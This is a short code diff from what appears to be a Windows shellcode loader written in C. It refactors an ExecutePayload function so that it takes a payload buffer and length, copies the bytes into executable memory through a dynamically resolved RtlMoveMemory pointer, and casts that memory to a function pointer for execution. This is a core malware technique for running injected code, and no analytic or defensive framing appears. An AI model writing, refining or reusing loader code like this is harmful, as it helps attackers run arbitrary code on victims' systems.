@@ -1,15 +1,10 @@
-void ExecutePayload(void* exec_mem) {
-    if (exec_mem == NULL) {
-        DEBUG_PRINT("ExecutePayload: Received a NULL memory pointer. Aborting.");
+void ExecutePayload(void* exec_mem, const unsigned char* payload, SIZE_T payload_len) {
+    if (exec_mem == NULL || payload == NULL) {
+        DEBUG_PRINT("ExecutePayload: Received a NULL pointer. Aborting.");
         return;
     }
 
-    if (pfnRtlMoveMemory == NULL) {
-        DEBUG_PRINT("ExecutePayload: RtlMoveMemory function pointer is NULL!");
-        return;
-    }
-
-    pfnRtlMoveMemory(exec_mem, bytecode, bytecode_len);
+    pfnRtlMoveMemory(exec_mem, payload, payload_len);
     DEBUG_PRINT("ExecutePayload: Bytecode copied to executable memory at %p.", exec_mem);
 
     void (*payload_func)() = (void(*)())exec_mem;
